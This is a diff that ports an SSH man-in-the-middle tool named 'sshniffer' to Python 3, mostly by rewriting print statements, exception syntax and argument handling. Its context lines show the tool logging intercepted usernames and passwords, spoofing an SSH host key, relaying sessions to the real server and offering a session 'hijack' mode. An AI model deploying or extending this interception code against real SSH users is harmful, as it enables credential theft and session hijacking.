@@ -99,15 +99,15 @@ BAD = '\033[91m'
 CLEAR = '\033[00m'
 
 def print_attn(string):
-    print ATTN + string + CLEAR 
+    print(ATTN + string + CLEAR )
 def print_purp(string):
-    print PURP + string + CLEAR
+    print(PURP + string + CLEAR)
 def print_good(string):
-    print GOOD + string + CLEAR
+    print(GOOD + string + CLEAR)
 def print_warn(string):
-    print WARN + string + CLEAR
+    print(WARN + string + CLEAR)
 def print_bad(string):
-    print BAD + string + CLEAR
+    print(BAD + string + CLEAR)
 
 class sshniffer(paramiko.server.ServerInterface):
 
@@ -144,7 +144,7 @@ class sshniffer(paramiko.server.ServerInterface):
                 return paramiko.AUTH_SUCCESSFUL
 
         except Exception as e:
-            print str(e)
+            print(e)
             self.logfile.write("[~.~] Bad login | %s:%s\n" % (username,password))
             self.logfile.write("__________________________\n")
             self.retry_hack()    
@@ -199,11 +199,11 @@ class hijacked_sshniffer(paramiko.server.ServerInterface):
 
     def check_auth_publickey(self,username,key):
     # host_key is our private key
-        print "username: %s" % username
+        print("username: %s" % username)
         if username == "lil_sshniffer" and key==host_key:
-            print "success!"
+            print("success!")
             return paramiko.AUTH_SUCCESSFUL
-        print "FAIL"
+        print("FAIL")
         return paramiko.AUTH_FAILED
 
     def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
@@ -231,7 +231,7 @@ def main(args):
         host_key = paramiko.rsakey.RSAKey(filename=args.spoof_key)
         print_good("[^.^] Rsa key read in: %s" % args.spoof_key)
     except Exception as e:
-        print e
+        print(e)
         print_bad("[x.x] Unable to open keyfile %s" % args.spoof_key)
         print_bad("[-_-] Might need to generate with: ssh-keygen -t rsa -N \"\" -f id_rsa")
         sys.exit()
@@ -264,7 +264,7 @@ def main(args):
                 pass
 
         except Exception as e:
-            print e
+            print(e)
             pass
 
 
@@ -385,7 +385,6 @@ def create_ssh_channel(out_trans):
 
     except:
         print_bad("[x.x] Couldn't connect to endpoint....DIPSET")
-        in_trans.close()
         out_trans.close()
         sys.exit()
 
@@ -404,7 +403,7 @@ def tcp_client_handler(sock,address,out_trans,logfile,kill_switch,inhook,outhook
     while True:
         try:
             if kill_switch.is_set():
-                print "Thread closing" 
+                print("Thread closing" )
                 break
 
             inb = get_bytes(out_chan)    
@@ -426,19 +425,19 @@ def tcp_client_handler(sock,address,out_trans,logfile,kill_switch,inhook,outhook
                 out_chan.send(outb)
             
             if not len(inb) and not len(outb):
-                print "[*.*] No more data"
+                print("[*.*] No more data")
                 break
 
-        except KeyboardInterrupt, socket.error:
+        except (KeyboardInterrupt, socket.error):
             break    
         '''
         except Exception as e:
-            print str(e)
+            print(e)
             break
         '''
            
 
-    print "[>.<] Connection to %s:%d closed!" % address
+    print("[>.<] Connection to %s:%d closed!" % address)
     sock.close()
     out_trans.close()
     sys.exit()
@@ -468,14 +467,14 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag,in
 
     #client authenticates to us, we pass along to endpoint, and respond accordingly
     if args.debug:
-        print "[<.<] Accepting transport..."
+        print("[<.<] Accepting transport...")
 
     in_chan = in_trans.accept(60)
     if retry_hack:    
         out_trans = ssh_sniff.get_endpoint()
 
     if args.debug:
-        print "[?.?] Transport accepted?"
+        print("[?.?] Transport accepted?")
 
     if not in_chan:
         print_bad( "[x.x] Failed Auth, killing connection")
@@ -593,10 +592,10 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag,in
     if filtering:
         try:
             if ssh_sniff.netkit.client_buffer.hijack_flag == True:
-                print "Setting Hijack"
+                print("Setting Hijack")
                 hijack_flag.set()
         except Exception as e:
-            print e 
+            print(e)
             pass
     ######
     ##/end while True and not kill_switch.is_set():    
@@ -705,7 +704,7 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag,in
                     resp_expected = False
                     logfile.write(inb + '\n')
                 except Exception as e:
-                    print str(e)
+                    print(e)
                     #no bytes => conn closed
                     break
 
@@ -747,14 +746,14 @@ def auth_ssh(dst_transport,addr):
                 #check cmdline args for user/pass first
                 try:
                     if not username:
-                        username = raw_input("[o.o] Username:") 
+                        username = input("[o.o] Username:") 
                     if not password or retry_count > 0:
                         password = getpass.getpass("[~.~] Password:") 
                     dst_transport.auth_password(username,password,None,False)
                 except KeyboardInterrupt:
                     return
                 except Exception as e:
-                    print e
+                    print(e)
                     retry_count+=1
         # try to auth. On fail, kill.
         else:
@@ -807,8 +806,7 @@ def get_bytes(chan,timeout=0):
 
 
 
-if __name__ == "__main__":
-    
+def get_args():
     if len(sys.argv) < 2:
         sys.argv.append("-h")
 
@@ -870,4 +868,5 @@ if __name__ == "__main__":
     if args.cisco:
         cisco_mode = True
 
-    main(args)
+if __name__ == "__main__":
+    main(get_args())
